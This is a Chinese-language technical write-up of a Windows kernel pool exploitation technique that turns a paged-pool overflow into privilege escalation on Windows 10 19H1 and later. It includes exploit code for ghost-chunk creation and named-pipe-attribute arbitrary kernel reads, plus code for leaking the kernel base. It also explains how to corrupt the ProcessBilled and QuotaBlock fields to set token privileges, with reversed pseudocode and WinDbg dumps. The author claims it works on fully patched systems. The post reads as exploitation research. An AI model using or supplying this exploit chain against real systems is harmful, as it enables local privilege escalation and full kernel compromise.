## 引用 ##

>这篇文章的目的是介绍一种基于内核态内存的越界写入通用利用技术和相关工具复现.

[toc]

## 简介 ## 

笔者的在原作者[池风水利用工具](https://github.com/synacktiv/Windows-kernel-SegmentHeap-Aligned-Chunk-Confusion)(以下简称工具)基础上进行二次开发,新增了全自动获取内核调试模块符号的偏移量及配置参数和不同漏洞利用方式优化等功能,
解决了不同Windows版本适配问题,工具包括适配驱动和利用程序两部分组成,实现了在Windows 10 19H1之后任意版本包括满补丁系统上的稳定利用.

自Windows 10 19H1开始，用户层段堆（Segment Heap）结构后端逻辑被用于内核层，主要分为低碎片化堆(Low-fragmentation Heap)与VS堆(Variable Sized Heap),这2种堆的分配与合并机制不在本文的讨论范围,具体可以参考相关引用链接.本文讨论的这个工具是基于一种缓存(Cache)对齐内核池优化利用技术,下面我们就来分析下这种技术.

### 分析 ### 

对于所有的内核态内存堆分配通过[ExAllocatePoolWithTag](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepoolwithtag)申请和[ExFreePoolWithTag](https://docs.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nf-wdm-exfreepoolwithtag)释放. 申请的结构指针都以PoolHeader作为头部,体现了当前分配堆的基本信息.通常使用!pool addr命令查看这些基本信息,也可以使用!poolused [Flags [TagString]] 或者!poolfind TagString [PoolType] 这2个命令可以用于查找指定Tag类型的pool信息,缺点是速度较慢.
```
typedef struct {
	char previousSize;
	char poolIndex;
	char blockSize;
	char poolType;
	int tag;
	void* processBilled;
}PoolHeader;
//poolType对应的所有pool类型,具体区别参考相关内核书籍
NonPagedPool = 0
PagedPool = 1
NonPagedPoolMustSucceed = 2
DontUseThisType = 3
NonPagedPoolCacheAligned = 4
PagedPoolCacheAligned = 5
NonPagedPoolCacheAlignedMustSucceed = 6
MaxPoolType = 7
PoolQuota = 8
NonPagedPoolSession = 20h
PagedPoolSession = 21h
NonPagedPoolMustSucceedSession = 22h
DontUseThisTypeSession = 23h
NonPagedPoolCacheAlignedSession = 24h
PagedPoolCacheAlignedSession = 25h
NonPagedPoolCacheAlignedMustSSession = 26h
NonPagedPoolNx = 200h
NonPagedPoolNxCacheAligned = 204h
NonPagedPoolSessionNx = 220h
```
当调用ExAllocatPoolWithTag时，如果PoolType有CacheAligned(Bit 3)位被设置，函数执行后返回的内存是与Cache对齐的。所分配的堆空间被2个PoolHeader描述,其中前一个PreviousSize为0,BlockSize为整个分配的实际池大小,后一个的PreviousSize为两个headers之间的偏移,而且这个PoolHeader的PoolType必须CacheAligned被置位,BlockSize和前一个相同.当释放后一个PoolHeader的内存时,系统会根据对齐的POOL_HEADER中使用PreviousSize字段寻找前一个PoolHeader也就是原始块并释放它指向的pool空间.工具正是利用的这个原理,通过自己实现的一个驱动越界写入当前漏洞块的下一个堆块(覆盖块)的PoolHeader,将CacheAligned置位,覆盖PreviousSize通过计算出前一个PoolHeader构造一个虚假的幽灵块(这个块的起始地址也在漏洞块的数据区域中),这个幽灵块的结束地址等于覆盖块结束地址.由于当系统认为覆盖块已经释放,覆盖块所占据的内存已被幽灵块覆盖,并且块上的所有引用都已经被删除,所以对接下来漏洞块和幽灵块重写和释放不产生影响.工具利用了一种称为pipe_attribute的利用技术,因为幽灵块所在内存的起始位置处在漏洞块可写在区域中,所以可以通过pipe_attribute结构来占位内存,给幽灵块伪造一个Fake_Pipe_Attribute,这个结构体的头部位于漏洞块,使pipe_attribute->list.Flink指向一个用户态内存的可控另一个用户态pipe_attribute结构,这样就能使用get_pipe_attribute读取这个pipe_attribute->AttributeValue指向的任意内核态指定大小地址的内存.我们来看下ida反汇编代码的具体实现.
```
struct pipe_attribute
{
  LIST_ENTRY list;
  char *AttributeName;
  __int64 ValueSize;
  char *AttributeValue;
  char data[1];
};
//任意读内核态内存
void pp_exploit_arbitrary_read(xploit_t * xploit, uintptr_t where, char * out, size_t size)
{
     xploit->fake_pipe_attribute->ValueSize = ask_size;
    xploit->fake_pipe_attribute->AttributeValue = (char *)where;
    if (!get_pipe_attribute(&xploit->ghosts->pipes[xploit->ghost_idx], arb_read, 0x1000))
    {
        fprintf(stderr, "[-] Failed to set pipe attribute !");
        exit(0);
    }
    memcpy(out, arb_read, size);
}
void pipe_init(PIPES* pipes) {
	if (!CreatePipe(&pipes->read, &pipes->write, NULL, 0x1000)) {
		printf("createPipe fail\n");
		return 1;
	}
	return 0;
}
// 写入PipeAttribution
int pipe_write_attr(PIPES* pipes, char* name, void* value, int total_size) {
	size_t length = strlen(name);
	memcpy(tmp_buffer, name, length + 1);
	memcpy(tmp_buffer + length + 1, value, total_size - length - 1);
	IO_STATUS_BLOCK  statusblock;
	char output[0x100];
	int mystatus = NtFsControlFile(pipes->write, NULL, NULL, NULL,
		&statusblock, 0x11003C, tmp_buffer, total_size,
		output, sizeof(output));
	if (!NT_SUCCESS(mystatus)) {
		printf("pipe_write_attr fail 0x%x\n", mystatus);
		return 1;
	}
	return 0;
}
// 读取PipeAttribution
int pipe_read_attr(PIPES* pipes, char* name, char* output,int size) {
	IO_STATUS_BLOCK statusblock;
	int mystatus = NtFsControlFile(pipes->write, NULL, NULL, NULL,
		&statusblock, 0x110038, name,strlen(name)+1,
		output, size);
	if (!NT_SUCCESS(mystatus)) {
		printf("pipe_read_attr fail 0x%x\n", mystatus);
		return 1;
	}
	return 0;
}
```
内核态PipeStream命名管道驱动的具体实现位于Npfs.sys文件中,通过堆相关代码的逆向发现,调用FsControlCode函数操作码0x11003C,0x110038可以用于读取和写入pipe_attribute相关结构字段的属性,其中AttributeName和AttributeValue类似于一种键值对的字典数据结构,在写入attribute过程中,命名管道驱动通过ExAllocatePoolWithTag申请输入缓冲区大小加上pipe_attribute头部大小内存保存于返回pipe_attribute结构体指针,并拷贝缓冲区输入数据至pipe_attribute->data,当AttributeName大小小于8时AttributeName直接保存在此字段中,如果大于8则计算AttributeName结束与'\0'字符串结尾位置作为AttributeValue的起始地址,用得出的申请Pool相对地址(也就是相对于pipe_attribute结构体指针地址)偏移量保存于AttributeName和AttributeValue这2个指针中.NpSetAttribute逆向结果显示当调用输入缓冲区AttributeValue长度为0时,系统会循环遍历attribute->list.Flink链表节点,链表的每个节点也都是一个pipe_attribute结构,如果目标链表AttributeName与要找的输入缓冲区AttributeName相同,就调用ExFreePoolWithTag释放这个链表对应的内存,对于读取attribute,也同样是遍历链表判断是否与AttributeName相同,如果是就拷贝AttributeValue指向的内存至输出缓冲区.由于命名管道驱动并不提供写入AttributeValue指向内存地址数据的功能,所以我们只能得到一个任意读的原语.
```
//FsControlCode是0x11003C是参数2等于2
signed __int64 __fastcall NpSetAttribute(pipe_attribute *attr, int value2){
 int attrNameEnd,attrnamebufstart=0;
 _BYTE * attrnamebufstart = attr->bufstart;
  do
  {
    if ( !*attrnamebufstart )
      break;
    ++attrNameEnd;
    ++attrnamebufstart;
  }
  while ( attrNameEnd < bufend ); 
//先计算ATTRIBUTE_NAME位置接下来数据都是ATTRIBUTE_VALUE 
  int attrValuestart = attrNameEnd + 1; 
 if ( attrValuestart >= bufend )
  {
    int attrValueBuf = 0;
    int  AttrValueSize = 0;
  }
  else
  {  
  _BYTE * attrValueBuf = &bufstart[attrValuestart];
   int AttrValueSize = bufend - attrValuestart;
  }
    pipe_attribute *pa = *(_QWORD *)((pipe_attribute *)(attr->bufend_ptr->real_buf->ret_buf & 0xFFFFFFFFFFFFFFFCui64))->data +  0x10 * ((unsigned int)(attr->bufend_ptr->real_buf->ret_buf >> 1) & 1 + 0x14));
   if ( attrValueBuf )
    {
      NpSetAttributeInList(pa, 0, bufstart, attrValueBuf, AttrValueSize);
      
    }
    else
    {
      NpRemoveAttributeFromList(pa, bufstart);      
    }
}
//bufstart就是用户层缓冲区起始地址
signed __int64 __fastcall NpSetAttributeInList(pipe_attribute *pa, _QWORD *zero, _BYTE *buf, const void *attrValueBuf, size_t attrValueSize)
{
 int  AttributeNameLen =stlen(buf);
 int attrValuestartlen=AttributeNameLen+1;
 int allocsize=attrValuestartlen+attrValueSize;
 !poolused tApN
 pipe_attribute * paret = ExAllocatePoolWithTag(PagedPool, allocsize, 'tApN');
  if ( (unsigned __int64)bufRef <= 7 )
  {
   //
    paret->AttributeName = bufRef;
  }
  else
  {
    paret->AttributeName = paret->data;
    memmove(paret->data, bufRef, attrValuestartlen);
  }
  if ( attrValueSize <= 8 )
  {
    attrValueAddr = (char *)&paret->AttributeValue;
  }
  else
  {
    attrValueAddr = &paret->data[attrValuestartlen];
    paret->AttributeValue = attrValueAddr;
  }
 memmove(attrValueAddr, attrValueBufRef, attrValueSize);
 paret->ValueSize = attrValueSize;
 //保存pa结构体到Flink
 pa->Flink = &paret->list.Flink;
}
//释放pa结构体的Flink指向的链表
signed __int64 __fastcall NpRemoveAttributeFromList(pipe_attribute *pa, __int64 bufstart)
{
 pipe_attribute *next = (pipe_attribute *)pa->list.Flink;
 while(true)
 {
_BYTE * AttributeNameBuf = next->AttributeName;
 int  AttributeNameLen = bufstart - AttributeNameBuf;
  do
  {
    // 就是比较用户层buf和attrname是不是一样,不一样就找链表下一个,相当于遍历字典结构 
  _BYTE  buflookup = (unsigned __int8)AttributeNameBuf[AttributeNameLen];
  BOOL  NotZero = (unsigned __int8)*AttributeNameBuf - buflookup;
    if ( (unsigned __int8)*AttributeNameBuf != buflookup )
      break;
    ++AttributeNameBuf;
  }
  while ( buflookup );
   if ( NotZero )
    break;
	next = (pipe_attribute *)next->list.Flink;  
}
//判断要释放的链表是否为中间链表
   if ( (pipe_attribute *)nextnext->Blink != next || (back = next->list.Blink, (pipe_attribute *)back->Flink != next) )
    __fastfail(3u);
  back->Flink = nextnext;
  nextnext->Blink = back;
  ExFreePoolWithTag(next, 0);
  return 0i64;
}
//FsControlCode是0x110038是参数2也等于2
signed __int64 __fastcall NpGetAttribute(PipeAttr *attr, int value2)
{
 pipe_attribute *pa = *(_QWORD *)((pipe_attribute *)(attr->bufend_ptr->real_buf->ret_buf & 0xFFFFFFFFFFFFFFFCui64))->data +  0x10 * ((unsigned int)(attr->bufend_ptr->real_buf->ret_buf >> 1) & 1 + 0x14));
 //读取的地址指向pa->AttributeValue大小是pa->ValueSize
 hr = NpGetAttributeFromList(pa, (unsigned __int64)bufstart, &Src, &Size);
 memmove(bufstart, Src, Size);         
}
//bufstart就是用户层缓冲区起始地址
signed __int64 __fastcall NpGetAttributeFromList(pipe_attribute *pa, unsigned __int64 bufstart, _QWORD *srcToCopy, _QWORD *size)
{
 pipe_attribute * that = pa->list.Flink;
  while ( (unsigned __int64)buf < 7 )
  {
    if ( that->AttributeName == buf )
      goto copyBuf;
next_pipe:
    that = (pipe_attribute *)that->list.Flink;
    if ( that == paref )
      return 0xC0000225i64;
	  //可以是用户层的地址
	 _BYTE * AttributeNameBuf = that->AttributeName;
	 int  AttributeNameLen = buf - AttributeNameBuf;
  do
  {
    // 就是比较用户层buf和attrname是不是一样,不一样就找链表下一个,相当于遍历字典结构 
  _BYTE  buflookup = (unsigned __int8)AttributeNameBuf[AttributeNameLen];
  BOOL  NotZero = (unsigned __int8)*AttributeNameBuf - buflookup;
    if ( (unsigned __int8)*AttributeNameBuf != buflookup )
      break;
    ++AttributeNameBuf;
  }
  while ( buflookup );
  if ( NotZero )
    goto next_pipe;
  }
  copyBuf:
  if ( that->ValueSize > 8ui64 )
    *srcToCopy = (char **)*AttributeValue;
  *srcToCopy =that->AttributeValue;
  *size = that->ValueSize;
  return 0i64;
}
```

攻击利用堆溢出来覆盖已分配的幽灵块的POOL_HEADER中的ProcessBilled指针，当块被释放时，如果pool的PoolType包含PoolQuota（0x8）标志位，那么ProcessBilled字段存储的指针将被用于解引用一个值。这个值通过和ExpPoolQuotaCookie异或解引用后是一个EPROCESS指针,EPROCESS的QuotaBlock字段也是一个指针最终它指向的值会被递减一个指定值也就是当前pool的大小。如果将EPROCESS其中的QuotaBlock字段保存了指向了当前进程的Token的Enabled和Present这2个字段的地址,那么递减后SeDebugPrivilege特权位将被设置,这足以从用户态实现权限提升,下面我们来逆向下具体实现。
```
__int64 __fastcall ExFreeHeapPool(ULONG_PTR poolheader){

 int PoolTag = poolheader->PoolTag;
   //PoolType包含PoolQuota（0x8）标志位
    if ( PoolTag & 8 )
    {
    PEPROCESS  proc = (PEPROCESS)((unsigned __int64)poolheader ^ ExpPoolQuotaCookie ^ (_QWORD)poolheader->ProcessBilled);
//0x568就是EPROCESS的QuotaBlock字段偏移量	
          PspReturnQuota(
            *(char **)(((unsigned __int64)poolheader ^ ExpPoolQuotaCookie ^ (_QWORD)poolheader->ProcessBilled) + 0x568),
            (unsigned __int64)poolheader ^ ExpPoolQuotaCookie ^ (_QWORD)poolheader->ProcessBilled,
            v9 & 1,
            16i64 * (unsigned __int8)*((_WORD *)&poolheader->0 + 1));
}
//valueThunckSize就是pool分配的大小,调试获取的值是0x210,目的的递减进程配额Quota大小减去ChunkSize
unsigned __int64 __fastcall PspReturnQuota(char *QuotaBlock, ULONG_PTR proc, int value8and0, ULONG_PTR valueThunckSize)
{
_QWORD _RDI_Token_EnabledPresent_Ptr = *(_QWORD *)&QuotaBlock[v6];
_QWORD Token_EnabledPresent_Value = *(_QWORD *)&QuotaBlock[v6];
 while ( 1 )
  {
    do
    {
	//如果ChunkSize大于进程配额Quota,直接置零,否则减去ChunkSize
      if ( valueThunckSizeRef >= Token_EnabledPresent_Value )
      {
        lookupValue = Token_EnabledPresent_Value;
       QWORD  Deleta = 0i64;
      }
      else
      {
        lookupValue = valueThunckSize;
       QWORD Deleta = Token_EnabledPresent_Value - valueThunckSize;
      }
      // 如果地址_RDI_Token_EnabledPresent_Ptr指向值等于Token_EnabledPresent_Value修改指向值为Deleta,也就说递减valueThunckSize
      result = _InterlockedCompareExchange(_RDI_Token_EnabledPresent_Ptr, Deleta, Token_EnabledPresent_Value);
      equal = Token_EnabledPresent_Value == result;
      Token_EnabledPresent_Value = result;
    }
    while ( !equal );
}
```

### 调试分析 ###

下面我们通过具体的调试输出验证下漏洞运行的实际结果.笔者使用了0x180的分页内存区域pool大小,在覆盖块被覆盖之前pool布局
```
sxe ld:poolqudong.sys "bp poolqudong!CommandCopy"
//g_Buffer 指针指向的就是漏洞块的地址ffffad09`df3f8a40
1: kd> !pool poi(g_Buffer)-10; //ffffad09df3f8a40
DBGHELP: SharedUserData - virtual symbol module
Pool page ffffad09df3f8a40 region is Paged pool
 ffffad09df3f80e0 size:  190 previous size:    0  (Allocated)  NpAt
 ffffad09df3f8270 size:  190 previous size:    0  (Allocated)  NpAt
 ffffad09df3f8400 size:  190 previous size:    0  (Allocated)  NpAt
 ffffad09df3f8590 size:  190 previous size:    0  (Allocated)  NpAt
 ffffad09df3f8720 size:  190 previous size:    0  (Allocated)  NpAt
 ffffad09df3f88b0 size:  190 previous size:    0  (Allocated)  NpAt
*ffffad09df3f8a40 size:  190 previous size:    0  (Allocated) *VULN
		Owning component : Unknown (update pooltag.txt)
//下个就是覆盖块		
 ffffad09df3f8bd0 size:  190 previous size:    0  (Allocated)  NpAt
 ffffad09df3f8d60 size:  190 previous size:    0  (Allocated)  NpAt
//poi(g_Buffer)+180就是ffffad09df3f8bd0
1: kd> dt nt!_pool_header poi(g_Buffer)+180;
   +0x000 PreviousSize     : 0y00000000 (0)
   +0x000 PoolIndex        : 0y00000000 (0)
   //漏洞块大小是190
   +0x002 BlockSize        : 0y00011001 (0x19)
   +0x002 PoolType         : 0y00000011 (0x3)
   +0x000 Ulong1           : 0x3190000
   +0x004 PoolTag          : 0x7441704e
   +0x008 ProcessBilled    : (null) 
   +0x008 AllocatorBackTraceIndex : 0
   +0x00a PoolTagHash      : 0
```
覆盖块被之后覆盖,此时覆盖块已经不能被系统正常识别,它的POOL_HEADER中使用PreviousSize被设置为0x15,并且CacheAligned置位,覆盖块的地址ffffad09df3f8bd0-(0x15*0x10)=ffffad09`df3f8a80也就是就是接下来要伪造的幽灵块,
```
//在trigger_vuln(xploit, overflow, xploit->offset_to_pool_header + 4);执行之后
1: kd> !pool poi(g_Buffer)-10;
Pool page ffffad09df3f8a40 region is Paged pool
 ffffad09df3f80e0 size:  190 previous size:    0  (Allocated)  NpAt
 ffffad09df3f8270 size:  190 previous size:    0  (Allocated)  NpAt
 ffffad09df3f8400 size:  190 previous size:    0  (Allocated)  NpAt
 ffffad09df3f8590 size:  190 previous size:    0  (Allocated)  NpAt
 ffffad09df3f8720 size:  190 previous size:    0  (Allocated)  NpAt
 ffffad09df3f88b0 size:  190 previous size:    0  (Allocated)  NpAt
*ffffad09df3f8a40 size:  190 previous size:    0  (Allocated) *VULN
		Owning component : Unknown (update pooltag.txt)
//覆盖块已经不能被系统正常识别
ffffad09df3f8bd0 doesn't look like a valid small pool allocation, checking to see
if the entire page is actually part of a large page allocation...
//就是覆盖块ffffad09df3f8bd0的POOL_HEADER
1: kd> dt nt!_pool_header poi(g_Buffer)+180=ffffad09`df3f8bd0;
   //PreviousSize被设置为0x15,ffffad09df3f8bd0-(0x15*0x10)就是接下来要伪造的幽灵块
   +0x000 PreviousSize     : 0y00010101 (0x15)
   +0x000 PoolIndex        : 0y00000000 (0)
   +0x002 BlockSize        : 0y00000000 (0)
   +0x002 PoolType         : 0y00000100 (0x4)
   +0x000 Ulong1           : 0x4000015
   //CacheAligned置位,0x7441704e&4!=0
   +0x004 PoolTag          : 0x7441704e
   +0x008 ProcessBilled    : (null) 
   +0x008 AllocatorBackTraceIndex : 0
   +0x00a PoolTagHash      : 0
1: kd> dc poi(g_Buffer)-10 L100;
ffffad09`df3f8a40  03190000 4e4c5556 00000000 00000000  ....VULN........
ffffad09`df3f8a50  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD
...
ffffad09`df3f8bc0  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD
ffffad09`df3f8bd0  04000015 7441704e 00000000 00000000  ....NpAt........
ffffad09`df3f8be0  df8d6ad0 ffffad09 df8d6ad0 ffffad09  .j.......j......
ffffad09`df3f8bf0  df3f8c08 ffffad09 00000156 00000000  ..?.....V.......   
//ValueSize=0x156,AttributeName是ffffad09`df3f8c08还有AttributeValue是ffffad09`df3f8c0a
ffffad09`df3f8c00  df3f8c0a ffffad09 4141005a 41414141  ..?.....Z.AAAAAA
ffffad09`df3f8c10  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
ffffad09`df3f8c20  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
ffffad09`df3f8c30  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
ffffad09`df3f8c40  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
ffffad09`df3f8c50  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
ffffad09`df3f8c60  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
spray_pipes(xploit->respray);//被执行
```
就是接下来要伪造的幽灵块在漏洞块+0x30的位置,使用一个pipe_attribute结构体占位,pipe_attribute->ValueSize=0x1d6+ATTRIBUTE_NAME_LEN加上sizeof(pipe_attribute)也正好是幽灵块的大小0x210
```
//在xploit->alloc_ghost_chunk(xploit, attribute);执行之后
0: kd> dc poi(g_Buffer)-10 L100;
ffffad09`df3f8a40  03190000 7441704e 00000000 00000000  ....NpAt........
ffffad09`df3f8a50  dfd73cb0 ffffad09 dfd73cb0 ffffad09  .<.......<......
ffffad09`df3f8a60  df3f8a78 ffffad09 00000156 00000000  x.?.....V.......
ffffad09`df3f8a70  df3f8a7a ffffad09 4242005a 42424242  z.?.....Z.BBBBBB
ffffad09`df3f8a80  03217d00 7441704e 42424242 42424242  .}!.NpAtBBBBBBBB
//pipe_attribute->list.Flink指向一个正常的pipe_attribute结构体,就是 xploit->leak_root_attribute
ffffad09`df3f8a90  df8c7ad0 ffffad09 df8c7ad0 ffffad09  .z.......z......
//ValueSize=0x1d6,AttributeName是ffffad09`df3f8ab8还有AttributeValue是ffffad09`df3f8aba
ffffad09`df3f8aa0  df3f8ab8 ffffad09 000001d6 00000000  ..?.............
ffffad09`df3f8ab0  df3f8aba ffffad09 4343005a 43434343  ..?.....Z.CCCCCC
0: kd> dt nt!_pool_header poi(g_Buffer)+30=ffffad09`df3f8a80
   +0x000 PreviousSize     : 0y00000000 (0)
   +0x000 PoolIndex        : 0y01111101 (0x7d)
//pipe_attribute->ValueSize=0x1d6加上sizeof(pipe_attribute)也正好是幽灵块的大小0x210  
   +0x002 BlockSize        : 0y00100001 (0x21)
   +0x002 PoolType         : 0y00000011 (0x3)
   +0x000 Ulong1           : 0x3217d00
   +0x004 PoolTag          : 0x7441704e
   +0x008 ProcessBilled    : 0x42424242`42424242 _EPROCESS
   +0x008 AllocatorBackTraceIndex : 0x4242
   +0x00a PoolTagHash      : 0x4242
```	
由于我们获得了可控pipe_attribute结构体内容的幽灵块和可覆盖pipe_attribute结构体内所在内存的起始位置数据的漏洞块,通过读取这片泄露的内存,就可以计算出幽灵块的真实地址和一个泄露正常的pipe_attribute结构体.
公式如下:


xploit->ghost_chunk=pipe_attribute->AttributeName-sizeof(pipe_attribute)-sizeof(_pool_header)是ffffad09df3f8ab8-0x28-0x10=ffffad09df3f8a80.

效果如图:

![查看大图](https://s4.ax1x.com/2021/12/30/TRsOr4.png)

接下来重写漏洞块给幽灵块伪造一个Fake_Pipe_Attribute,使pipe_attribute->list.Flink指向一个用户态内存的可控另一个用户态pipe_attribute结构,就能使用get_pipe_attribute读取fake_pipe_attribute->AttributeValue指向的任意内核态指定大小地址的内存.
```
//xploit->setup_ghost_overwrite(xploit, rewrite_buf);执行之后
1: kd> dc poi(g_Buffer)-10 L100;
ffffad09`df3f8a40  03190000 7441704e 00000000 00000000  ....NpAt........
ffffad09`df3f8a50  e053bef0 ffffad09 e053bef0 ffffad09  ..S.......S.....
ffffad09`df3f8a60  df3f8a78 ffffad09 00000156 00000000  x.?.....V.......
ffffad09`df3f8a70  df3f8a7a ffffad09 4545005a 45454545  z.?.....Z.EEEEEE
ffffad09`df3f8a80  45454545 45454545 45454545 45454545  EEEEEEEEEEEEEEEE
//pipe_attribute->list.Flink指向一个用户态内存00000145`2f29e4b0
ffffad09`df3f8a90  2f29e4b0 00000145 cafeb00b deadbeef  ..)/E...........
ffffad09`df3f8aa0  44c386d0 00007ff6 00000001 00000000  ...D............
ffffad09`df3f8ab0  44c386d0 00007ff6 45454545 45454545  ...D....EEEEEEEE
指向一个用户态内存一个可控的伪造pipe_attribute结构体
0: kd> dc 00000145`2f29e4b0
00000145`2f29e4b0  cafe0000 deaddead cafe0000 deaddead  ................
00000145`2f29e4c0  b6e886cc 00007ff7 00000100 00000000  ................
00000145`2f29e4e0  cafeaaaa deadbeef fdfdfdfd dddddddd  ................
00000145`2f29e4f0  dddddddd dddddddd d23b27c4 0c008cd8  .........';.....

```
作者使用任意读的原语实现了一个很巧妙的方式获取nt模块的基址,这些符号在不同的不同windows版本存在差异(笔者实现了解决方法),具体为如下方式
```
void find_kernel_base(xploit_t* xploit)
{
	uintptr_t file_object_ptr = 0;
	uintptr_t file_object;
	uintptr_t device_object;
	uintptr_t driver_object;
	uintptr_t NpFsdCreate;
	uintptr_t ExAllocatePoolWithTag;
	//xploit->leak_root_attribute就是rcx=ffffad09df8c7ad0
    uintptr_t file_object_ptr = xploit->leak_root_attribute - ROOT_PIPE_ATTRIBUTE_OFFSET + FILE_OBJECT_OFFSET;
    // FsContext2 structure of NPFS. Find the pointer on the file object in the structure  
    xploit->leak_root_queue = xploit->leak_root_attribute - ROOT_PIPE_ATTRIBUTE_OFFSET + ROOT_PIPE_QUEUE_ENTRY_OFFSET;	
	// Get the leak of ntoskrnl and npfs
	exploit_arbitrary_read(xploit, file_object_ptr, (char*)&file_object, 0x8);
	printf("[+] File object is : 0x%llx\n", file_object);
	exploit_arbitrary_read(xploit, file_object + 8, (char*)&device_object, 0x8);
	printf("[+] Device object is : 0x%llx\n", device_object);
	exploit_arbitrary_read(xploit, device_object + 8, (char*)&driver_object, 0x8);
	printf("[+] Driver object is : 0x%llx\n", driver_object);
	exploit_arbitrary_read(xploit, driver_object + 0x70, (char*)&NpFsdCreate, 0x8);
	printf("[+] Major function is : 0x%llx\n", NpFsdCreate);
	uintptr_t ExAllocatePoolWithTag_ptr = NpFsdCreate - NPFS_NPFSDCREATE_OFFSET + NPFS_GOT_ALLOCATEPOOLWITHTAG_OFFSET;	
	exploit_arbitrary_read(xploit, ExAllocatePoolWithTag_ptr, (char*)&ExAllocatePoolWithTag, 0x8);
	printf("[+] ExAllocatePoolWithTag is : 0x%llx\n", ExAllocatePoolWithTag);
	xploit->kernel_base = ExAllocatePoolWithTag - NT_ALLOCATEPOOLWITHTAG_OFFSET;
	printf("[+] kernel_base is : 0x%llx\n", xploit->kernel_base);
}
```
通过调试发现,函数Npfs!NpSetAttributeInList在执行过程中它的第一个参数rcx=ffffad09df8c7ad0如果为一个正常pipe_attribute结构体指针,那么它就和当前irp请求的file_object->FsContext2中的这个字段存在一定关系,接下来验证这个结果
```
Breakpoint 2 hit
Npfs!NpSetAttributeInList:
fffff806`2f2b5434 48895c2408      mov     qword ptr [rsp+8],rbx
1: kd> r
////pipe_attribute->list.Flink指向一个正常的pipe_attribute结构体rcx=ffffad09df8c7ad0
rax=00000000000001d6 rbx=ffffad09df8c79d0 rcx=ffffad09df8c7ad0
rdx=0000000000000000 rsi=ffffbe0780f7e620 rdi=0000000000000002
rip=fffff8062f2b5434 rsp=ffffa601e671c5a8 rbp=ffffad09df8c7ad0
 r8=ffffbe0780f7e620  r9=ffffbe0780f7e622 r10=fffff806292609e0
r11=0000000000000000 r12=ffffbe077eb3dd70 r13=ffffbe07933bb320
r14=ffffad09db8d3900 r15=ffffbe0780f7e622
iopl=0         nv up ei pl zr na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040246
Npfs!NpSetAttributeInList:
fffff806`2f2b5434 48895c2408      mov     qword ptr [rsp+8],rbx ss:0018:ffffa601`e671c5b0=ffffad09df8c79d0
//查看当前线程信息
1: kd> !thread
THREAD ffffbe0786ec70c0  Cid 0bf4.14ac  Teb: 0000000aef327000 Win32Thread: 0000000000000000 RUNNING on processor 1
IRP List:
//irp在这里
    ffffbe077eb3dd70: (0006,0160) Flags: 00060870  Mdl: 00000000
Not impersonating
DeviceMap                 ffffad09dbe81290
Owning Process            ffffbe07872d0080       Image:         poolfs.exe
Attached Process          N/A            Image:         N/A
Wait Start TickCount      12031          Ticks: 6468 (0:00:01:41.062)
Context Switch Count      147            IdealProcessor: 1             
UserTime                  00:00:00.000
KernelTime                00:00:00.062
Win32 Start Address 0x00007ff644b3b3af
Stack Init ffffa601e671cc90 Current ffffa601e671c6a0
Base ffffa601e671d000 Limit ffffa601e6717000 Call 0000000000000000
Priority 8 BasePriority 8 PriorityDecrement 0 IoPriority 2 PagePriority 5
Child-SP          RetAddr               : Args to Child                                                           : Call Site
ffffa601`e671c5a8 fffff806`2f2b53d5     : ffffad09`df8c79d0 00000000`00000001 ffffa601`00000000 ffffbe07`80f7e620 : Npfs!NpSetAttributeInList
ffffa601`e671c5b0 fffff806`2f2b0f66     : ffffad09`db8d3900 ffffbe07`7e6e58f0 00000000`000001d6 00000000`00000000 : Npfs!NpSetAttribute+0x231
ffffa601`e671c620 fffff806`2f2ac847     : ffffbe07`7e6e58f0 00000000`00000000 00000000`00000000 ffffbe07`7eb3de88 : Npfs!NpCommonFileSystemControl+0x46d6
ffffa601`e671c6c0 fffff806`29252f55     : ffffbe07`874d1dc0 fffff806`27714b46 ffffa601`e671d000 ffffa601`e6717000 : Npfs!NpFsdFileSystemControl+0x27
ffffa601`e671c6f0 fffff806`27716ccf     : ffffbe07`7e08eda0 00000000`00000000 00000000`00000000 00000000`00000000 : nt!IofCallDriver+0x55
ffffa601`e671c730 fffff806`2774caf4     : ffffa601`e671c7c0 00000000`00000000 00000000`000000c8 fffff806`2962b3c1 : FLTMGR!FltpLegacyProcessingAfterPreCallbacksCompleted+0x28f
ffffa601`e671c7a0 fffff806`29252f55     : 00000000`0000000a ffffbe07`7eb3dd70 00000000`00000002 00000000`00000001 : FLTMGR!FltpFsControl+0x104
ffffa601`e671c800 fffff806`295fd878     : ffffa601`e671cb80 ffffbe07`7eb3dd70 00000000`00000001 ffffbe07`872d0080 : nt!IofCallDriver+0x55
ffffa601`e671c840 fffff806`295fd145     : 00000000`0011003c ffffa601`e671cb80 00000000`00000005 ffffa601`e671cb80 : nt!IopSynchronousServiceTail+0x1a8
ffffa601`e671c8e0 fffff806`296c2666     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!IopXxxControlFile+0x5e5
ffffa601`e671ca20 fffff806`294074b5     : 00000000`00008354 fffff806`2970900e 00000000`00000000 ffffbe07`876e7080 : nt!NtFsControlFile+0x56
ffffa601`e671ca90 00007ffb`a470cd44     : 00007ff6`44b42606 00007ff6`44c82048 00000000`00000000 0000000a`ef4fdb00 : nt!KiSystemServiceCopyEnd+0x25 (TrapFrame @ ffffa601`e671cb00)
0000000a`ef4fdaa8 00007ff6`44b42606     : 00007ff6`44c82048 00000000`00000000 0000000a`ef4fdb00 00000145`2f290000 : ntdll!NtFsControlFile+0x14
//查看当前irp
1: kd> !irp ffffbe077eb3dd70
Irp is active with 2 stacks 1 is current (= 0xffffbe077eb3de40)
 No Mdl: System buffer=ffffbe0780f7e620: Thread ffffbe0786ec70c0:  Irp stack trace.  
     cmd  flg cl Device   File     Completion-Context
>[IRP_MJ_FILE_SYSTEM_CONTROL(d), N/A(0)]
//file_object默认第一个ffffbe07933bb320
            4 e0 ffffbe077e6e58f0 ffffbe07933bb320 fffff806277143b0-ffffbe07874d1dc0 Success Error Cancel 
